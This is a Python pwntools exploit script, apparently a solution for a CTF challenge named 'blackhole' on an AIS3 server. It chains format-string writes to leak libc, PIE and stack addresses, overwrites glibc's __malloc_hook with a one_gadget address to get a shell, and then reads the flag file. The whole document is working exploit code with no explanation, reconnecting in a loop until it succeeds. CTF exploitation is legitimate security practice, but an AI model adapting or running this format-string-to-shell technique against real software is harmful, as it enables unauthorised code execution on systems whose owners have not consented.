#!/usr/bin/env python
from pwn import *

context.arch = 'amd64'

l = ELF( './libc-2.27.so' )

def fmt( p , r = True ):
    if r:
        y.send( p + 'AAA\0' )
        y.recvuntil( 'AAA' )
    else:
        y.send( p + '\0' )
        sleep( 0.16 )
        

while True:
    y = remote( 'eof.ais3.org' , 1337 )
    #y = process( 'blackhole' , stderr=-1 )

    try:
        fmt( '%{}c%7$hn'.format( 0x6010 ) , False )
        fmt( '%{}c%9$hhn'.format( 1 ) , False )
        fmt( 'yuawn' , False )
        y.recvuntil( 'yuawn' )

        fmt( '%10$p.%6$p.%5$p.' , False )
        y.recvuntil( '0x' )

        l.address = int( y.recvuntil('.')[:-1] , 16 ) - 0x21b97
        success( 'libc -> %s' % hex( l.address ) )
        pie = int( y.recvuntil('.')[:-1] , 16 ) - 0x11fa
        success( 'pie -> %s' % hex( pie ) )
        stk = int( y.recvuntil('.')[:-1] , 16 )
        success( 'stk -> %s' % hex( stk ) )

        t = (stk & 0xff) + 0x10

        fmt( '%{}c%7$hn'.format( l.sym.__malloc_hook & 0xffff ) )
        fmt( '%{}c%5$hhn'.format( t + 2 ) )
        fmt( '%{}c%7$hn'.format( (l.sym.__malloc_hook >> 16) & 0xffff ) )
        fmt( '%{}c%5$hhn'.format( t + 4 ) )
        fmt( '%{}c%7$hn'.format( (l.sym.__malloc_hook >> 32) & 0xffff ) )

        fmt( '%{}c%5$hhn'.format( t + 8 ) )
        fmt( '%{}c%7$hn'.format( (l.sym.__malloc_hook + 2) & 0xffff ) )
        fmt( '%{}c%5$hhn'.format( t + 10 ) )
        fmt( '%{}c%7$hn'.format( (l.sym.__malloc_hook >> 16) & 0xffff ) )
        fmt( '%{}c%5$hhn'.format( t + 12 ) )
        fmt( '%{}c%7$hn'.format( (l.sym.__malloc_hook >> 32) & 0xffff ) )

        fmt( '%{}c%5$hhn'.format( t + 0x10 ) )
        fmt( '%{}c%7$hn'.format( (l.sym.__malloc_hook + 4) & 0xffff ) )
        fmt( '%{}c%5$hhn'.format( t + 0x12 ) )
        fmt( '%{}c%7$hn'.format( (l.sym.__malloc_hook >> 16) & 0xffff ) )
        fmt( '%{}c%5$hhn'.format( t + 0x14 ) )
        fmt( '%{}c%7$hn'.format( (l.sym.__malloc_hook >> 32) & 0xffff ) )

        one = l.address + 0xe569f

        p = [ (one & 0xffff , 9), ((one >> 16) & 0xffff , 10), ((one >> 32) & 0xffff , 11) ]
        p = sorted( p , key = lambda x:x[0] )

        print p
        fmt( '%{}c%{}$hn%{}c%{}$hn%{}c%{}$hn'.format( p[0][0] , p[0][1] , p[1][0] - p[0][0] , p[1][1] , p[2][0] - p[1][0] , p[2][1] ) )

        y.sendline( 'yuawn' )
        sleep( 0.2 )
        y.sendline( 'cat /home/*/flag' )

        y.interactive()
        y.close()
    except Exception:
        y.close()